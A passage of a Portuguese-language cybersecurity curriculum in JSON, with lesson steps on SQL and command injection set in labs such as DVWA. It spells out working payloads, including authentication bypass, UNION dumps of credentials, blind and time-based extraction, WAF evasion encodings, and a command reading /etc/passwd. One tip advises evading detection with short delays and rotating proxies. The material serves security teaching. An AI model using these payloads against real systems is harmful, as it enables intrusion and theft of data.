                                    "Teste em ambiente simulado como DVWA ou SQLi Lab."
                                  ],
                                  "verification": "Execute um demo de SQLi e explique o antes/depois da query executada.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramenta DVWA (Damn Vulnerable Web App)",
                                    "Browser com Burp Suite Community para interceptar requests"
                                  ],
                                  "tips": "Sempre use ambientes isolados como Docker para testes de segurança.",
                                  "learningObjective": "Mapear como input malicioso altera a semântica de uma query SQL.",
                                  "commonMistakes": "Não escapar aspas corretamente no payload; esquecer de considerar prepared statements como mitigação."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Mecanismo em Command Injection",
                                  "subSteps": [
                                    "Estude comando OS vulnerável: system('ping ' . $_GET['host']);",
                                    "Injete payload: 127.0.0.1; cat /etc/passwd para executar comando adicional.",
                                    "Trace separadores: ; ou | permitem chain de comandos.",
                                    "Analise execução: ping falha mas cat revela dados sensíveis.",
                                    "Simule em lab com ping command injection vulnerable app."
                                  ],
                                  "verification": "Capture output de um command injection bem-sucedido e descreva o impacto.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Vulnerable app como Command Injection Lab (DVWA)",
                                    "Terminal Linux para testes locais"
                                  ],
                                  "tips": "Preste atenção a separadores de comandos por OS (Windows: &, Linux: ;).",
                                  "learningObjective": "Identificar como falhas de sanitização permitem execução arbitrária de comandos do sistema.",
                                  "commonMistakes": "Ignorar filtros parciais como blacklists; assumir que inputs numéricos são seguros."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar Mecanismo Geral e Impactos",
                                  "subSteps": [
                                    "Generalize: atacante quebra contexto (string, comando) via caracteres especiais e injeta lógica própria.",
                                    "Compare SQLi vs. Command Inj: ambos exploram trust em input não validado.",
                                    "Discuta impactos: divulgação de dados, escalação de privilégios, RCE.",
                                    "Estude mitigações: prepared statements, whitelisting, escaping contextual.",
                                    "Crie diagrama unificado do mecanismo de exploração."
                                  ],
                                  "verification": "Desenhe um fluxograma mostrando input → exploração → alteração de lógica.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta de diagrama como Draw.io",
                                    "OWASP Cheat Sheet Injection Prevention"
                                  ],
                                  "tips": "Pense em termos de 'quebra de contexto' para qualquer tipo de injeção.",
                                  "learningObjective": "Generalizar o mecanismo para qualquer falha de sanitização em comandos/queries.",
                                  "commonMistakes": "Focar só em SQLi e ignorar variações como NoSQL ou LDAP injection."
                                }
                              ],
                              "practicalExample": "Em um login web vulnerável, input ' OR 1=1 -- na senha faz a query SELECT * FROM users WHERE user='admin' AND pass='' OR 1=1 --' retornar todos usuários, logando como admin sem senha válida.",
                              "finalVerifications": [
                                "Explicar verbalmente o mecanismo de SQLi em <2 minutos.",
                                "Demonstrar command injection em lab e capturar evidência.",
                                "Identificar 3 payloads para cenários dados.",
                                "Diferenciar exploração de detecção de vulnerabilidades.",
                                "Listar 2 mitigações por tipo de injeção.",
                                "Criar diagrama de fluxo de exploração."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica: payloads e fluxos corretos (30%)",
                                "Clareza na explicação: linguagem acessível e lógica (25%)",
                                "Profundidade: cobertura de generalização e impactos (20%)",
                                "Evidências práticas: demos ou diagramas (15%)",
                                "Conexão com mitigações: demonstração de prevenção (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Programação: Entendimento de string handling e parsing.",
                                "Lógica Computacional: Boolean logic e controle de fluxo.",
                                "Ética e Direito: Implicações legais de exploração (LGPD/GDPR).",
                                "Matemática: Teoria de linguagens formais e parsers."
                              ],
                              "realWorldApplication": "Exploração de SQLi no hack da Sony Pictures (2014) vazou dados de 47k funcionários; command injection em servidores web permite RCE, como no Equifax breach onde injeções agravaram roubo de dados de 147M pessoas."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.1.1.3",
                            "name": "Analisar impacto de ataques de injeção",
                            "description": "Avaliar as consequências potenciais, como divulgação de dados, alteração de registros ou execução arbitrária de código no servidor.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os fundamentos e tipos de ataques de injeção",
                                  "subSteps": [
                                    "Revise os conceitos básicos de injeção, como SQL Injection, XSS e Command Injection.",
                                    "Identifique vetores comuns de ataque, como campos de formulário, URLs e APIs.",
                                    "Estude exemplos reais de payloads maliciosos para cada tipo.",
                                    "Analise como a falta de sanitização de entradas permite a injeção.",
                                    "Diferencie injeção de outros ataques como CSRF ou XXE."
                                  ],
                                  "verification": "Liste pelo menos 3 tipos de ataques de injeção com um exemplo de payload para cada.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Guia OWASP Top 10 - Injection",
                                    "Ferramenta DVWA (Damn Vulnerable Web Application) para demo",
                                    "Vídeos tutoriais no YouTube sobre SQLi e XSS"
                                  ],
                                  "tips": "Comece com SQL Injection, pois é o mais comum e impactante em bancos de dados.",
                                  "learningObjective": "Dominar a identificação precisa dos tipos de ataques de injeção e seus mecanismos.",
                                  "commonMistakes": [
                                    "Confundir injeção com buffer overflow",
                                    "Ignorar variações como NoSQL Injection",
                                    "Subestimar impactos em aplicações modernas como APIs REST"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear impactos potenciais de cada tipo de ataque",
                                  "subSteps": [
                                    "Para SQL Injection: liste divulgação de dados, alteração de registros e bypass de autenticação.",
                                    "Para XSS: descreva roubo de cookies, defacement e phishing persistente.",
                                    "Para Command Injection: detalhe execução arbitrária de código no servidor.",
                                    "Classifique impactos pela tríade CIA (Confidencialidade, Integridade, Disponibilidade).",
                                    "Quantifique exemplos, como número de registros afetados ou downtime causado."
                                  ],
                                  "verification": "Crie uma tabela com 3 tipos de injeção e seus 3 principais impactos cada.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "OWASP Cheat Sheet - Injection Prevention",
                                    "Relatórios de brechas como Equifax (SQLi)",
                                    "Ferramenta Burp Suite Community para análise"
                                  ],
                                  "tips": "Use a tríade CIA como framework para organizar impactos de forma sistemática.",
                                  "learningObjective": "Associar cada ataque de injeção a consequências específicas e mensuráveis.",
                                  "commonMistakes": [
                                    "Focar apenas em SQLi e ignorar outros tipos",
                                    "Não considerar impactos em cadeia, como escalada de privilégios",
                                    "Superestimar disponibilidade em detrimento de confidencialidade"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Avaliar severidade e probabilidades dos impactos",
                                  "subSteps": [
                                    "Aplique matriz de risco: probabilidade (baixa/média/alta) x impacto (baixo/médio/crítico).",
                                    "Considere fatores agravantes como dados sensíveis (PII, PCI-DSS).",
                                    "Simule cenários: impacto em um e-commerce vs. sistema bancário.",
                                    "Calcule métricas como CVSS score para exemplos de ataques.",
                                    "Discuta ramificações legais e financeiras, como multas GDPR."
                                  ],
                                  "verification": "Preencha uma matriz de risco para 2 cenários de injeção com scores CVSS.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Calculadora CVSS online (nvd.nist.gov)",
                                    "Casos de estudo: brecha Sony Pictures (SQLi)",
                                    "Planilha Excel para matriz de risco"
                                  ],
                                  "tips": "Priorize impactos críticos como execução remota de código sobre meras divulgações.",
                                  "learningObjective": "Capacitar análise qualitativa e quantitativa de riscos de injeção.",
                                  "commonMistakes": [
                                    "Ignorar contexto do negócio ao avaliar severidade",
                                    "Confundir probabilidade com frequência histórica",
                                    "Não incluir custos indiretos como perda de reputação"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar impactos em um cenário prático simulado",
                                  "subSteps": [
                                    "Configure um ambiente vulnerável (ex: DVWA com SQLi).",
                                    "Execute um ataque e observe impactos reais (dump de DB, alteração de dados).",
                                    "Registre evidências: logs, screenshots de dados vazados.",
                                    "Compare com mitigações (prepared statements) e meça redução de impacto.",
                                    "Redija um relatório resumindo análise de impacto."
                                  ],
                                  "verification": "Produza um relatório de 1 página com evidências e análise de 1 ataque simulado.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "DVWA ou bWAPP para simulação",
                                    "Docker para ambiente isolado",
                                    "sqlmap para automação de testes"
                                  ],
                                  "tips": "Use ambientes virtuais para evitar riscos reais; documente tudo com timestamps.",
                                  "learningObjective": "Aplicar análise de impacto em prática controlada.",
                                  "commonMistakes": [
                                    "Executar em ambientes de produção",
                                    "Não registrar evidências fotográficas",
                                    "Pular comparação com controles de segurança"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um e-commerce vulnerável, um atacante usa SQL Injection no campo de login (' OR 1=1 --) para dump do banco de dados, divulgando 100.000 cartões de crédito, alterando estoques e executando comandos no servidor para instalar ransomware, resultando em perda financeira de milhões e downtime de 48h.",
                              "finalVerifications": [
                                "Lista completa de 5+ impactos por tipo de injeção.",
                                "Matriz de risco preenchida com scores CVSS para 3 cenários.",
                                "Relatório prático com evidências de simulação.",
                                "Explicação clara da tríade CIA aplicada a injeções.",
                                "Identificação correta de 3 mitigações que reduzem impactos.",
                                "Análise de pelo menos 1 caso real de brecha histórica."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de impactos específicos (90%+ acerto).",
                                "Uso correto de frameworks como CIA e CVSS.",
                                "Profundidade nos substeps e exemplos práticos.",
                                "Qualidade do relatório simulado com evidências.",
                                "Capacidade de quantificar riscos (probabilidade x impacto).",
                                "Conexão clara com contexto real de cibersegurança."
                              ],
                              "crossCurricularConnections": [
                                "Programação Web: Sanitização de inputs em linguagens como PHP/Python.",
                                "Gestão de Riscos: Matrizes CVSS e conformidade GDPR/HIPAA.",
                                "Ética e Direito: Implicações legais de brechas de dados.",
                                "Desenvolvimento de Software: Práticas de Secure Coding (OWASP)."
                              ],
                              "realWorldApplication": "Durante auditorias de penetração (pentest) ou revisões de código em equipes de DevSecOps, permitindo priorizar vulnerabilidades de injeção em aplicações web críticas, como bancos ou healthtechs, e recomendar remediações baseadas em análise de impacto."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.1.2",
                        "name": "SQL Injection",
                        "description": "Tipo específico de ataque de injeção focado em bancos de dados relacionais, utilizando sintaxe SQL maliciosa para manipular consultas.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.1.2.1",
                            "name": "Construir payloads de SQL Injection",
                            "description": "Criar exemplos de payloads como ' OR 1=1 -- para burlar autenticações e extrair dados de bancos de dados via injeção SQL.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a estrutura de consultas SQL vulneráveis",
                                  "subSteps": [
                                    "Analise uma consulta SQL típica em aplicações web, como SELECT * FROM users WHERE username = '$user' AND password = '$pass';",
                                    "Identifique pontos de entrada de usuário não sanitizados (inputs diretos em queries).",
                                    "Estude o fluxo de execução de queries em bancos como MySQL ou PostgreSQL.",
                                    "Examine exemplos de queries vulneráveis em logs ou documentação OWASP.",
                                    "Pratique desmontando queries reais de tutoriais éticos."
                                  ],
                                  "verification": "Descreva verbalmente ou por escrito a vulnerabilidade em uma query exemplo, destacando onde a injeção ocorre.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação OWASP SQL Injection",
                                    "Ferramenta DVWA ou bWAPP em ambiente local",
                                    "Editor de texto como VS Code"
                                  ],
                                  "tips": "Sempre use ambientes de teste isolados como Docker com DVWA para evitar impactos reais.",
                                  "learningObjective": "Identificar e explicar componentes de uma query SQL suscetível a injeção.",
                                  "commonMistakes": [
                                    "Confundir parâmetros preparados com concatenação de strings",
                                    "Ignorar diferenças entre DBMS (MySQL vs SQL Server)",
                                    "Não considerar filtros de input existentes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Construir payloads básicos para bypass de autenticação",
                                  "subSteps": [
                                    "Crie o payload clássico: ' OR 1=1 -- para tornar a condição sempre verdadeira.",
                                    "Teste variações como ' OR '1'='1 para diferentes encodings.",
                                    "Adicione comentários como # ou /* */ para neutralizar o resto da query.",
                                    "Experimente payloads com AND/OR lógicos para refinar o bypass.",
                                    "Documente o impacto esperado: login sem credenciais válidas."
                                  ],
                                  "verification": "Execute o payload em um lab vulnerável e confirme acesso não autorizado ao dashboard.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ambiente DVWA configurado com SQLi low security",
                                    "Burp Suite Community ou browser dev tools",
                                    "Lista de payloads OWASP"
                                  ],
                                  "tips": "Use proxies como Burp para interceptar e modificar requests facilmente.",
                                  "learningObjective": "Desenvolver payloads que alterem logicamente queries para bypassar autenticação.",
                                  "commonMistakes": [
                                    "Esquecer o espaço antes de OR",
                                    "Não usar comentários para truncar query",
                                    "Testar em sites reais (nunca faça isso sem permissão)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desenvolver payloads para extração de dados via UNION",
                                  "subSteps": [
                                    "Determine o número de colunas com ORDER BY 1--, 2--, etc., até erro.",
                                    "Use UNION SELECT para anexar dados: ' UNION SELECT 1,2,3--",
                                    "Extraia nomes de tabelas com UNION SELECT table_name FROM information_schema.tables--",
                                    "Obtenha dados sensíveis como usernames e passwords hashed.",
                                    "Combine com payloads de bypass para sessões completas de dump."
                                  ],
                                  "verification": "Extraia pelo menos 3 registros de uma tabela fictícia e liste-os corretamente.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "DVWA ou Mutillidae com MySQL",
                                    "SQLMap como referência (apenas leitura)",
                                    "Notepad para mapear colunas"
                                  ],
                                  "tips": "Conte colunas manualmente antes de UNION para evitar erros de mismatch.",
                                  "learningObjective": "Criar payloads que permitam dumping de dados de bancos via injeção.",
                                  "commonMistakes": [
                                    "Mismatch no número de colunas em UNION",
                                    "Não escapar strings com aspas duplas",
                                    "Ignorar versionamento do DBMS"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar técnicas de evasão e ofuscação",
                                  "subSteps": [
                                    "Use encoding URL: %27%20OR%201%3D1%20--",
                                    "Aplique case variation: ' oR 1=1 --",
                                    "Incorpore funções como CHAR(39) para aspas: CHAR(39) OR 1=1 --",
                                    "Teste contra WAFs simulados com espaços substituídos por /**/.",
                                    "Crie payloads multi-etapa para extrações complexas."
                                  ],
                                  "verification": "Bypass um filtro simulado (ex: DVWA medium/high) e extraia dados.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramentas como sqlmap --tamper para inspiração",
                                    "Labs com WAF como ModSecurity",
                                    "Cheatsheet de payloads evasivos"
                                  ],
                                  "tips": "Registre payloads que funcionam vs falham para padrões de detecção.",
                                  "learningObjective": "Adaptar payloads para contornar defesas comuns como filtros e WAFs.",
                                  "commonMistakes": [
                                    "Sobrecarregar com ofuscação desnecessária",
                                    "Não testar em múltiplos cenários",
                                    "Usar payloads não éticos em produção"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar, documentar e praticar eticamente",
                                  "subSteps": [
                                    "Teste todos payloads em labs controlados e registre resultados.",
                                    "Documente queries originais vs injetadas com screenshots.",
                                    "Discuta mitigações: prepared statements, input sanitization.",
                                    "Pratique em CTFs como HackTheBox ou TryHackMe.",
                                    "Autoavalie com rubrica de sucesso (bypass + extração)."
                                  ],
                                  "verification": "Produza um relatório de 1 página com 3 payloads testados e lições aprendidas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramentas de screenshot como Flameshot",
                                    "Templates de relatório pentest",
                                    "Plataformas CTF gratuitas"
                                  ],
                                  "tips": "Sempre enfatize: 'Use apenas em ambientes autorizados para aprendizado'.",
                                  "learningObjective": "Consolidar conhecimento com documentação ética e foco em defesa.",
                                  "commonMistakes": [
                                    "Não documentar falhas para aprendizado",
                                    "Ignorar aspectos legais/éticos",
                                    "Parar após sucesso inicial"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um form de login vulnerável com query SELECT * FROM users WHERE id = '$id', injete id=1' OR '1'='1' -- para retornar todos usuários, simulando extração de credenciais em um lab DVWA.",
                              "finalVerifications": [
                                "Consegue bypassar autenticação com pelo menos 2 payloads variados.",
                                "Extrai dados de tabela via UNION em ambiente controlado.",
                                "Aplica evasão básica contra filtros simples.",
                                "Documenta payloads com queries antes/depois.",
                                "Explica mitigações preventivas como PDO prepared statements.",
                                "Identifica erros comuns em payloads falhos."
                              ],
                              "assessmentCriteria": [
                                "Precisão dos payloads: 100% funcionais em labs padrão.",
                                "Profundidade de substeps: Mínimo 4 por step com detalhes acionáveis.",
                                "Uso ético: Todas menções a labs/CTFs, sem promoção de uso malicioso.",
                                "Completude técnica: Cobertura de bypass, dump e evasão.",
                                "Clareza de verificações: Mensuráveis e objetivas.",
                                "Criatividade em exemplos: Práticos e realistas para cibersegurança."
                              ],
                              "crossCurricularConnections": [
                                "Banco de Dados: Entendimento de SQL avançado e schemas.",
                                "Programação Web: Sanitização em PHP/Python/Node.js.",
                                "Ética e Direito: Leis como LGPD/GDPR em breaches simulados.",
                                "Redes: Integração com proxies e interceptação de tráfego.",
                                "Desenvolvimento de Software: OWASP Top 10 e secure coding."
                              ],
                              "realWorldApplication": "Em testes de penetração autorizados (pentests), bug bounties em plataformas como HackerOne, ou desenvolvimento de WAFs/firewalls para detectar e bloquear injeções SQL em aplicações reais, ajudando a proteger dados sensíveis de empresas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.1.1.1"
                            ]
                          },
                          {
                            "id": "10.1.4.1.2.2",
                            "name": "Detectar vulnerabilidades SQLi",
                            "description": "Utilizar ferramentas como SQLMap ou testes manuais para identificar pontos vulneráveis em formulários web e APIs.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente de Teste Seguro",
                                  "subSteps": [
                                    "Instalar uma máquina virtual com OWASP Juice Shop ou DVWA (Damn Vulnerable Web Application).",
                                    "Configurar um proxy como Burp Suite para interceptar tráfego HTTP.",
                                    "Verificar que o ambiente está isolado e não acessível publicamente.",
                                    "Executar scans iniciais com ferramentas como Nikto para mapear endpoints.",
                                    "Documentar a URL base e parâmetros de formulários/APIs vulneráveis."
                                  ],
                                  "verification": "Ambiente rodando com app vulnerável acessível localmente e proxy capturando requests.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "VMware/VirtualBox",
                                    "OWASP Juice Shop ou DVWA",
                                    "Burp Suite Community",
                                    "Nikto"
                                  ],
                                  "tips": "Use snapshots na VM para resetar o ambiente após testes.",
                                  "learningObjective": "Preparar um laboratório isolado para testes éticos de segurança web.",
                                  "commonMistakes": [
                                    "Testar em sites reais sem permissão",
                                    "Não isolar o ambiente",
                                    "Ignorar configuração de proxy"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Realizar Testes Manuais de SQL Injection",
                                  "subSteps": [
                                    "Identificar formulários de login, busca e parâmetros GET/POST em páginas web.",
                                    "Injetar payloads clássicos como ' OR 1=1 --, ' OR 'x'='x e observar respostas.",
                                    "Testar para erros SQL (ex: MySQL errors, ODBC errors) e delays com SLEEP(5).",
                                    "Usar técnicas de blind SQLi com boolean-based (AND 1=1 vs AND 1=2).",
                                    "Mapear parâmetros vulneráveis em APIs REST (ex: /api/users?id=1')."
                                  ],
                                  "verification": "Payloads causam erros SQL ou respostas anormais em pelo menos 2 endpoints.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Burp Suite",
                                    "Browser com dev tools",
                                    "Lista de payloads SQLi (ex: PayloadsAllTheThings)"
                                  ],
                                  "tips": "Sempre URL-encode payloads e teste em uppercase/lowercase.",
                                  "learningObjective": "Dominar detecção manual de SQLi através de payloads e análise de respostas.",
                                  "commonMistakes": [
                                    "Não testar variações de payloads",
                                    "Ignorar time-based blind SQLi",
                                    "Confundir erros de app com SQL errors"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Utilizar SQLMap para Detecção Automatizada",
                                  "subSteps": [
                                    "Instalar SQLMap via git ou pip e verificar versão (--version).",
                                    "Capturar requests com Burp e salvá-los como arquivo .txt para sqlmap -r.",
                                    "Executar sqlmap -u \"URL\" --batch --dbs para listar databases.",
                                    "Testar parâmetros específicos com --tamper=space2comment para bypass WAF.",
                                    "Analisar output para confirmação de vulnerabilidade (ex: payload usado, DBMS detectado)."
                                  ],
                                  "verification": "SQLMap confirma vulnerabilidade em pelo menos um parâmetro com detalhes de exploração.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "SQLMap",
                                    "Burp Suite para requests",
                                    "Lista de tampers SQLMap"
                                  ],
                                  "tips": "Use --level=3 --risk=3 para testes mais agressivos em labs.",
                                  "learningObjective": "Automatizar detecção de SQLi com SQLMap e interpretar resultados.",
                                  "commonMistakes": [
                                    "Executar sem --batch em labs",
                                    "Não usar tampers contra filtros",
                                    "Ignorar warnings de false positives"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar e Documentar Vulnerabilidades",
                                  "subSteps": [
                                    "Compilar evidências: screenshots de erros, payloads bem-sucedidos e outputs do SQLMap.",
                                    "Classificar severidade (CVSS score básico para SQLi).",
                                    "Sugerir mitigações: prepared statements, input sanitization.",
                                    "Testar em múltiplos browsers e APIs para confirmação.",
                                    "Gerar relatório em formato Markdown ou template OWASP."
                                  ],
                                  "verification": "Relatório completo com pelo menos 3 vulnerabilidades documentadas e mitigações.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Editor Markdown",
                                    "Templates de relatório Pentest",
                                    "CVSS calculator online"
                                  ],
                                  "tips": "Inclua PoC (Proof of Concept) reproduzível.",
                                  "learningObjective": "Documentar achados de forma profissional para relatórios de segurança.",
                                  "commonMistakes": [
                                    "Relatórios vagos sem evidências",
                                    "Não classificar risco",
                                    "Omitir mitigações"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab DVWA com nível 'Low', injete ' OR 1=1 -- no campo de usuário do login, resultando em bypass de autenticação. Com SQLMap: sqlmap -u \"http://dvwa/login.php?username=1&password=1\" --dbs lista 'dvwa' como DB vulnerável.",
                              "finalVerifications": [
                                "Identificar manualmente SQLi em 3 parâmetros diferentes.",
                                "SQLMap confirma vulnerabilidade com payload automático.",
                                "Documentar erros SQL e tipos (union, blind, error-based).",
                                "Testar bypass de filtros básicos com tampers.",
                                "Gerar relatório com PoC reproduzível.",
                                "Verificar ausência de false positives comparando manual vs auto."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de payloads SQLi (90%+ sucesso).",
                                "Uso correto de ferramentas sem erros de configuração.",
                                "Profundidade da análise (tipos de SQLi cobertos).",
                                "Qualidade do relatório (clareza, evidências, mitigações).",
                                "Tempo de execução dentro do estimado.",
                                "Compreensão demonstrada em verificações finais."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Entender queries SQL e prepared statements em linguagens como PHP/Python.",
                                "Redes: Análise de tráfego HTTP/HTTPS com proxies.",
                                "Desenvolvimento Web: Sanitização de inputs em front/back-end.",
                                "Ética e Direito: Regras de pentest ético e leis como LGPD/GDPR."
                              ],
                              "realWorldApplication": "Em bug bounty programs (HackerOne), pentests profissionais ou auditorias de segurança, detectando SQLi em apps reais para prevenir vazamentos de dados como no caso Equifax breach de 2017."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.1.1.2"
                            ]
                          },
                          {
                            "id": "10.1.4.1.2.3",
                            "name": "Explorar ataques avançados de SQLi",
                            "description": "Demonstrar técnicas como UNION-based, Blind SQLi e Time-based para extração de dados em cenários reais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente de Laboratório Seguro para Testes de SQLi Avançado",
                                  "subSteps": [
                                    "Instalar uma VM isolada com ferramentas como Kali Linux ou OWASP Broken Web Applications (BWA).",
                                    "Configurar DVWA (Damn Vulnerable Web Application) ou SQLi-Labs com níveis de segurança 'High' ou 'Impossible'.",
                                    "Verificar conectividade com Burp Suite ou browser para interceptar requests HTTP.",
                                    "Criar um banco de dados MySQL vulnerável com tabelas de teste contendo dados fictícios (ex: users, products).",
                                    "Resetar o ambiente para estado inicial e documentar payloads iniciais de SQLi básico."
                                  ],
                                  "verification": "Acessar a página de login vulnerável e confirmar injeção básica com ' OR 1=1 -- funciona, sem vazamento real de dados.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "VMware/VirtualBox",
                                    "DVWA ou SQLi-Labs",
                                    "Burp Suite Community",
                                    "MySQL Workbench"
                                  ],
                                  "tips": [
                                    "Sempre use ambientes isolados para evitar impactos reais; snapshot a VM antes de testes."
                                  ],
                                  "learningObjective": "Preparar um laboratório controlado e ético para simular ataques SQLi sem riscos reais.",
                                  "commonMistakes": [
                                    "Executar em ambientes de produção",
                                    "Ignorar configurações de segurança do DVWA",
                                    "Não fazer backup do banco de dados"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar UNION-based SQLi para Extração Direta de Dados",
                                  "subSteps": [
                                    "Identificar o número de colunas com ORDER BY e payloads como ' ORDER BY 1 --, aumentando até erro.",
                                    "Determinar tipos de colunas usando NULL e funções como CONCAT(database()).",
                                    "Construir UNION SELECT para dump de tabelas: ' UNION SELECT 1,username,password FROM users --'.",
                                    "Extrair nomes de DB, tabelas e colunas usando information_schema.",
                                    "Automatizar com sqlmap --technique=U para validação."
                                  ],
                                  "verification": "Extrair com sucesso pelo menos 3 registros de uma tabela users via response da página.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Burp Suite Repeater",
                                    "sqlmap",
                                    "DVWA SQLi page"
                                  ],
                                  "tips": [
                                    "Combine com URL encoding para payloads complexas; teste em múltiplos parâmetros."
                                  ],
                                  "learningObjective": "Dominar payloads UNION para bypass de filtros e extração visível de dados.",
                                  "commonMistakes": [
                                    "Número incorreto de colunas",
                                    "Esquecer de comentar o resto da query (--)",
                                    "Não alinhar tipos de dados nas colunas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Dominar Boolean-based Blind SQLi para Extração Invisível",
                                  "subSteps": [
                                    "Confirmar vulnerabilidade com payloads condicionais: ' AND 1=1 -- (true) vs AND 1=2 -- (false)'.",
                                    "Extrair caracteres um a um: ' AND ASCII(SUBSTRING(database(),1,1))>64 --'.",
                                    "Automatizar enumeração de DB, tabelas e dados com scripts Python ou sqlmap --technique=B.",
                                    "Testar em condições de resposta diferente (ex: welcome page vs error).",
                                    "Otimizar com binary search para reduzir requests."
                                  ],
                                  "verification": "Extrair nome do banco de dados e uma credencial completa via mudanças booleanas na resposta.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Burp Intruder",
                                    "Custom Python script with requests",
                                    "sqlmap"
                                  ],
                                  "tips": [
                                    "Use payloads com LIKE ou REGEXP para aceleração; monitore timing de respostas."
                                  ],
                                  "learningObjective": "Aprender a explorar SQLi sem output direto, focando em inferência lógica.",
                                  "commonMistakes": [
                                    "Payloads não balanceados",
                                    "Ignorar case sensitivity em comparações",
                                    "Timeouts em loops longos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Time-based Blind SQLi para Cenários Sem Diferenças Visíveis",
                                  "subSteps": [
                                    "Testar delays básicos: ' AND IF(1=1,SLEEP(5),0) --' para confirmar funcionalidade.",
                                    "Extrair dados bit a bit: ' AND (ASCII(SUBSTRING(user(),1,1))&1)=1 AND SLEEP(5) --'.",
                                    "Enumeração completa de credenciais usando funções como BENCHMARK ou SLEEP.",
                                    "Comparar eficiência com Boolean e automatizar via sqlmap --technique=T.",
                                    "Simular cenários reais com WAFs leves bypassando delays."
                                  ],
                                  "verification": "Causar delay consistente (>3s) condicional e extrair pelo menos um hash de senha.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Burp Suite",
                                    "sqlmap with --delay",
                                    "Watchdog timer script"
                                  ],
                                  "tips": [
                                    "Ajuste SLEEP para <5s para evitar detecção; use em conjunto com proxies rotativos."
                                  ],
                                  "learningObjective": "Explorar SQLi em apps sem feedback visual ou boolean, usando delays.",
                                  "commonMistakes": [
                                    "Delays não condicionais",
                                    "Excesso de requests causando bloqueio",
                                    "Funções incompatíveis com DBMS"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Integrar Técnicas em Cenários Reais e Verificar Mitigações",
                                  "subSteps": [
                                    "Combinar UNION + Blind em app multi-página (ex: search + login).",
                                    "Extrair dados sensíveis como admin creds em SQLi-Labs DVWA nível Hard.",
                                    "Testar defesas: prepared statements, WAF rules e logging.",
                                    "Documentar payloads bem-sucedidas e falhas em relatório.",
                                    "Praticar detecção reversa como defensor."
                                  ],
                                  "verification": "Relatório com dumps de 3 técnicas + 1 bypass de filtro simples.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "SQLi-Labs challenges",
                                    "ModSecurity WAF simulado"
                                  ],
                                  "tips": [
                                    "Registre todos requests; foque em rate-limiting para realismo."
                                  ],
                                  "learningObjective": "Aplicar técnicas compostas em simulações realistas e entender limites.",
                                  "commonMistakes": [
                                    "Não testar mitigações",
                                    "Payloads não adaptadas ao contexto",
                                    "Falta de documentação"
                                  ]
                                }
                              ],
                              "practicalExample": "Em DVWA nível High, na página User ID, injete '1' UNION SELECT null,concat(username,0x3a,password) FROM users -- para dump visível de credenciais como admin:5f4dcc3b5aa765d61d8327deb882cf99.",
                              "finalVerifications": [
                                "Configurar lab e executar SQLi básico sem erros.",
                                "Extrair dados via UNION em <50 requests.",
                                "Dump completo de DB via Boolean Blind em <200 requests.",
